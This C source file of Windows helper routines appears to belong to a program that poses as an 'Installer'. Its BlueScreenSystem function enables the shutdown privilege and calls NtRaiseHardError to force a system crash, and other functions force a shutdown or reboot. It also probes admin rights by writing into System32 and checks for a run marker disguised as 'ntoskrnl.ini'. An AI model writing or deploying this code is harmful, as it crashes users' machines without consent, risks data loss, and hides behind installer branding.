#include "tools.h"
#include "ntexport.h"



VOID InstallerError(LPWSTR ErrorMessage){
    MessageBoxW(NULL, ErrorMessage, L"Installer", MB_OK | MB_ICONERROR);
}

VOID ShowFailureResponse(DWORD errorCode){
    LPVOID lpMsgBuf;

    FormatMessageW(
        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL,
        errorCode,
        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
        (LPWSTR)&lpMsgBuf,
        0, NULL);

    InstallerError(lpMsgBuf);
    LocalFree(lpMsgBuf);
}

VOID BlueScreenSystem(){
    BOOLEAN result;
    RtlAdjustPrivilege(19L, TRUE, FALSE, &result);
    ULONG response;
    NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, OptionShutdownSystem, &response);
}

VOID ShutdownSystem(){
    BOOLEAN result;
    RtlAdjustPrivilege(19L, TRUE, FALSE, &result);
    ULONG response;
    NtShutdownSystem(ShutdownNoReboot);
}

VOID RestartSystem(){
    BOOLEAN result;
    RtlAdjustPrivilege(19L, TRUE, FALSE, &result);
    ULONG response;
    NtShutdownSystem(ShutdownReboot);
}

BOOL CheckIfAdministrator(){
    OFSTRUCT st;
    HFILE file = OpenFile("C:\\Windows\\System32\\idk.sys", &st, OF_CREATE);
    if(file == HFILE_ERROR){
        return FALSE;
    }
    else {
        CloseHandle((HANDLE)file);
        DeleteFileW(L"C:\\Windows\\System32\\idk.sys");
        return TRUE;
    }
}


BOOL CheckIfRan(){
    OFSTRUCT OpenBuff;
    HFILE file = OpenFile("C:\\Windows\\System32\\ntoskrnl.ini", &OpenBuff, OF_EXIST);
    if(file == HFILE_ERROR){
        return FALSE;
    }
    else{
        return TRUE;
    }
}

BOOL CheckIfWindows10OrGreater(){
    OFSTRUCT OpenBuff;
    HFILE file = OpenFile("C:\\Windows\\System32\\sihost.exe", &OpenBuff, OF_EXIST);
    if(file == HFILE_ERROR){
        return FALSE;
    }
    else{
        return TRUE;
    }
}


void* AllocateVirtualMemory(size_t size) {
    return VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
}

BOOL FreeVirtualMemory(void* memory) {
    return VirtualFree(memory, 0, MEM_RELEASE);
}

